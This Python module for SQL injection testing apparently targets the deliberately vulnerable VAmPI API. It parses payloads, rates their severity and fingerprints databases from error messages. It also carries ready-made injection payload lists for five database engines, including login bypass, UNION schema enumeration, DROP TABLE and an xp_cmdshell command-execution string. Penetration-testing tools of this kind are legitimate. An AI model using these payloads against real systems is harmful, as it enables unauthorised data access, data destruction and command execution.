#!/usr/bin/env python3
"""
SQL Analysis Module using sqlparse

This module enhances SQL injection testing by providing intelligent SQL analysis,
database fingerprinting, and advanced payload generation using the sqlparse library.
"""

import sqlparse
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum


class DatabaseType(Enum):
    """Supported database types"""
    UNKNOWN = "unknown"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    SQLSERVER = "sqlserver"


@dataclass
class SQLAnalysis:
    """Result of SQL analysis"""
    is_valid_sql: bool
    database_type: DatabaseType
    sql_type: Optional[str]
    tables: List[str]
    columns: List[str]
    functions: List[str]
    syntax_errors: List[str]
    extracted_info: List[Dict]
    vulnerability_level: str
    confidence_score: float


@dataclass
class DatabaseFingerprint:
    """Database fingerprinting result"""
    database_type: DatabaseType
    version_hints: List[str]
    specific_features: List[str]
    confidence_score: float
    evidence: List[str]


class SQLAnalyzer:
    """Advanced SQL analysis using sqlparse"""
    
    def __init__(self):
        self.database_patterns = {
            DatabaseType.MYSQL: [
                r"mysql error",
                r"you have an error in your sql syntax",
                r"warning: mysql",
                r"mysql_fetch_array",
                r"mysql_num_rows"
            ],
            DatabaseType.POSTGRESQL: [
                r"postgresql error",
                r"psql error",
                r"postgres error",
                r"pg_.*error",
                r"relation.*does not exist"
            ],
            DatabaseType.SQLITE: [
                r"sqlite error",
                r"sqlite3 error",
                r"no such table",
                r"no such column",
                r"near.*syntax error"
            ],
            DatabaseType.ORACLE: [
                r"ora-\d+",
                r"oracle error",
                r"invalid identifier",
                r"table or view does not exist"
            ],
            DatabaseType.SQLSERVER: [
                r"microsoft.*database engine",
                r"sql server error",
                r"unclosed quotation mark",
                r"incorrect syntax"
            ]
        }
        
        self.sql_keywords = [
            'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'ALTER',
            'UNION', 'JOIN', 'WHERE', 'FROM', 'GROUP BY', 'ORDER BY', 'HAVING'
        ]
    
    def _detect_sql_type_from_payload(self, payload: str) -> str:
        """Detect SQL type from injection payload using keyword analysis"""
        payload_upper = payload.upper()
        
        # Check for specific SQL statement types
        if any(keyword in payload_upper for keyword in ['DROP TABLE', 'DROP DATABASE']):
            return "DROP"
        elif any(keyword in payload_upper for keyword in ['DELETE FROM']):
            return "DELETE"
        elif any(keyword in payload_upper for keyword in ['INSERT INTO']):
            return "INSERT"
        elif any(keyword in payload_upper for keyword in ['UPDATE', 'SET']):
            return "UPDATE"
        elif any(keyword in payload_upper for keyword in ['UNION SELECT', 'UNION ALL']):
            return "UNION"
        elif any(keyword in payload_upper for keyword in ['SELECT', 'FROM']):
            return "SELECT"
        elif any(keyword in payload_upper for keyword in ['EXEC', 'EXECUTE', 'XP_CMDSHELL']):
            return "EXECUTE"
        elif any(keyword in payload_upper for keyword in ['OR', 'AND', 'WHERE']):
            return "CONDITIONAL"
        elif any(keyword in payload_upper for keyword in ['--', '/*', '*/']):
            return "COMMENT"
        elif any(keyword in payload_upper for keyword in [';']):
            return "MULTI_STATEMENT"
        else:
            return "INJECTION_FRAGMENT"
    
    def analyze_sql_payload(self, payload: str) -> SQLAnalysis:
        """Analyze SQL injection payload using sqlparse"""
        try:
            parsed = sqlparse.parse(payload)
            analysis = SQLAnalysis(
                is_valid_sql=False,
                database_type=DatabaseType.UNKNOWN,
                sql_type=None,
                tables=[],
                columns=[],
                functions=[],
                syntax_errors=[],
                extracted_info=[],
                vulnerability_level="low",
                confidence_score=0.0
            )
            
            if parsed and len(parsed) > 0:
                statement = parsed[0]
                analysis.is_valid_sql = True
                
                # Enhanced SQL type detection for injection payloads
                analysis.sql_type = self._detect_sql_type_from_payload(payload)
                analysis.confidence_score = 0.8
                
                # Extract structural information
                self._extract_sql_elements(statement, analysis)
                
                # Determine vulnerability level
                analysis.vulnerability_level = self._assess_vulnerability_level(payload, analysis)
                
                # Detect database type from payload
                analysis.database_type = self._detect_database_from_payload(payload)
                
        except Exception as e:
            analysis = SQLAnalysis(
                is_valid_sql=False,
                database_type=DatabaseType.UNKNOWN,
                sql_type=None,
                tables=[],
                columns=[],
                functions=[],
                syntax_errors=[str(e)],
                extracted_info=[],
                vulnerability_level="low",
                confidence_score=0.0
            )
        
        return analysis
    
    def _extract_sql_elements(self, statement, analysis: SQLAnalysis):
        """Extract SQL elements from parsed statement"""
        try:
            # Extract table names
            for token in statement.tokens:
                if hasattr(token, 'tokens'):
                    self._extract_sql_elements(token, analysis)
                elif token.is_keyword and token.value.upper() == 'FROM':
                    # Look for table names after FROM
                    pass
                elif token.is_name:
                    if not token.value.upper() in self.sql_keywords:
                        analysis.tables.append(token.value)
                        
        except Exception as e:
            analysis.syntax_errors.append(f"Extraction error: {str(e)}")
    
    def _assess_vulnerability_level(self, payload: str, analysis: SQLAnalysis) -> str:
        """Assess the vulnerability level of a SQL payload"""
        payload_lower = payload.lower()
        
        # Critical payloads
        critical_patterns = [
            "drop table", "delete from", "truncate table",
            "exec xp_cmdshell", "union select", "information_schema"
        ]
        
        # High risk payloads
        high_patterns = [
            "or '1'='1", "or 1=1", "union", "select *",
            "insert into", "update set"
        ]
        
        # Medium risk payloads
        medium_patterns = [
            "or", "and", "select", "from", "where"
        ]
        
        for pattern in critical_patterns:
            if pattern in payload_lower:
                return "critical"
        
        for pattern in high_patterns:
            if pattern in payload_lower:
                return "high"
        
        for pattern in medium_patterns:
            if pattern in payload_lower:
                return "medium"
        
        return "low"
    
    def _detect_database_from_payload(self, payload: str) -> DatabaseType:
        """Detect database type from payload characteristics"""
        payload_lower = payload.lower()
        
        # SQLite specific patterns (VAmPI uses SQLite)
        if "sqlite" in payload_lower or "sqlite3" in payload_lower:
            return DatabaseType.SQLITE
        
        # MySQL specific patterns
        if "mysql" in payload_lower or "information_schema" in payload_lower:
            return DatabaseType.MYSQL
        
        # PostgreSQL specific patterns
        if "postgres" in payload_lower or "pg_" in payload_lower:
            return DatabaseType.POSTGRESQL
        
        # Oracle specific patterns
        if "ora-" in payload_lower or "oracle" in payload_lower:
            return DatabaseType.ORACLE
        
        # SQL Server specific patterns
        if "xp_cmdshell" in payload_lower or "microsoft" in payload_lower:
            return DatabaseType.SQLSERVER
        
        # Enhanced detection for common injection patterns
        if "union select" in payload_lower:
            # UNION queries work across most databases, but VAmPI uses SQLite
            return DatabaseType.SQLITE
        
        if "drop table" in payload_lower:
            # DROP TABLE works in most databases, but VAmPI uses SQLite
            return DatabaseType.SQLITE
        
        if "exec xp_cmdshell" in payload_lower:
            # This is SQL Server specific
            return DatabaseType.SQLSERVER
        
        # Default to SQLite for VAmPI since that's what it actually uses
        return DatabaseType.SQLITE
    
    def fingerprint_database_from_error(self, error_response: str) -> DatabaseFingerprint:
        """Fingerprint database type from error response"""
        error_lower = error_response.lower()
        best_match = DatabaseType.UNKNOWN
        best_score = 0.0
        evidence = []
        
        for db_type, patterns in self.database_patterns.items():
            score = 0.0
            db_evidence = []
            
            for pattern in patterns:
                if re.search(pattern, error_lower, re.IGNORECASE):
                    score += 1.0
                    db_evidence.append(pattern)
            
            if score > best_score:
                best_score = score
                best_match = db_type
                evidence = db_evidence
        
        # Calculate confidence score
        confidence = min(best_score / 3.0, 1.0)  # Normalize to 0-1
        
        # Extract version hints
        version_hints = self._extract_version_hints(error_response)
        
        # Extract specific features
        specific_features = self._extract_database_features(error_response, best_match)
        
        return DatabaseFingerprint(
            database_type=best_match,
            version_hints=version_hints,
            specific_features=specific_features,
            confidence_score=confidence,
            evidence=evidence
        )
    
    def _extract_version_hints(self, error_response: str) -> List[str]:
        """Extract version hints from error response"""
        version_patterns = [
            r"mysql.*?(\d+\.\d+\.\d+)",
            r"postgresql.*?(\d+\.\d+\.\d+)",
            r"sqlite.*?(\d+\.\d+\.\d+)",
            r"oracle.*?(\d+\.\d+\.\d+)",
            r"sql server.*?(\d+\.\d+\.\d+)"
        ]
        
        versions = []
        for pattern in version_patterns:
            matches = re.findall(pattern, error_response, re.IGNORECASE)
            versions.extend(matches)
        
        return versions
    
    def _extract_database_features(self, error_response: str, db_type: DatabaseType) -> List[str]:
        """Extract database-specific features from error response"""
        features = []
        
        if db_type == DatabaseType.SQLITE:
            if "no such table" in error_response.lower():
                features.append("Table existence checking")
            if "no such column" in error_response.lower():
                features.append("Column existence checking")
            if "near" in error_response.lower() and "syntax error" in error_response.lower():
                features.append("SQLite syntax validation")
        
        elif db_type == DatabaseType.MYSQL:
            if "information_schema" in error_response.lower():
                features.append("Information schema access")
            if "mysql_fetch" in error_response.lower():
                features.append("MySQL result fetching")
        
        elif db_type == DatabaseType.POSTGRESQL:
            if "pg_" in error_response.lower():
                features.append("PostgreSQL system catalogs")
            if "relation" in error_response.lower():
                features.append("PostgreSQL relation handling")
        
        return features
    
    def generate_database_specific_payloads(self, db_type: DatabaseType) -> List[str]:
        """Generate database-specific SQL injection payloads"""
        payloads = {
            DatabaseType.SQLITE: [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3 --",
                "'; DROP TABLE users; --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "1' UNION SELECT sqlite_version(),2,3 --",
                "1' UNION SELECT name FROM sqlite_master WHERE type='table' --"
            ],
            DatabaseType.MYSQL: [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3 --",
                "'; DROP TABLE users; --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "1' UNION SELECT version(),2,3 --",
                "1' UNION SELECT table_name FROM information_schema.tables --"
            ],
            DatabaseType.POSTGRESQL: [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3 --",
                "'; DROP TABLE users; --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "1' UNION SELECT version(),2,3 --",
                "1' UNION SELECT tablename FROM pg_tables --"
            ],
            DatabaseType.ORACLE: [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3 FROM dual --",
                "'; DROP TABLE users; --",
                "' OR 1=1 --",
                "admin'--",
                "1' UNION SELECT banner,2,3 FROM v$version --"
            ],
            DatabaseType.SQLSERVER: [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3 --",
                "'; DROP TABLE users; --",
                "' OR 1=1 --",
                "admin'--",
                "1' UNION SELECT @@version,2,3 --",
                "1'; EXEC xp_cmdshell('dir'); --"
            ]
        }
        
        return payloads.get(db_type, payloads[DatabaseType.SQLITE])
    
    def validate_sql_structure(self, payload: str) -> bool:
        """Validate if a payload has valid SQL structure"""
        try:
            parsed = sqlparse.parse(payload)
            if parsed and len(parsed) > 0:
                statement = parsed[0]
                # Check if it's a valid SQL statement structure
                return statement.get_type() in ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'UNION']
            return False
        except Exception:
            return False
    
    def format_sql_payload(self, payload: str) -> str:
        """Format SQL payload for better readability"""
        try:
            formatted = sqlparse.format(payload, reindent=True, keyword_case='upper')
            return formatted
        except Exception:
            return payload
    
    def extract_sql_fragments(self, text: str) -> List[str]:
        """Extract potential SQL fragments from text"""
        # Look for SQL-like patterns
        sql_patterns = [
            r"SELECT\s+.*?FROM\s+.*?",
            r"INSERT\s+INTO\s+.*?VALUES\s+.*?",
            r"UPDATE\s+.*?SET\s+.*?",
            r"DELETE\s+FROM\s+.*?",
            r"UNION\s+SELECT\s+.*?",
            r"WHERE\s+.*?",
            r"FROM\s+.*?",
            r"JOIN\s+.*?"
        ]
        
        fragments = []
        for pattern in sql_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            fragments.extend(matches)
        
        return list(set(fragments))  # Remove duplicates


# Utility functions for easy access
def analyze_sql_payload(payload: str) -> SQLAnalysis:
    """Quick function to analyze SQL payload"""
    analyzer = SQLAnalyzer()
    return analyzer.analyze_sql_payload(payload)


def fingerprint_database(error_response: str) -> DatabaseFingerprint:
    """Quick function to fingerprint database from error"""
    analyzer = SQLAnalyzer()
    return analyzer.fingerprint_database_from_error(error_response)


def generate_payloads(db_type: DatabaseType) -> List[str]:
    """Quick function to generate database-specific payloads"""
    analyzer = SQLAnalyzer()
    return analyzer.generate_database_specific_payloads(db_type) 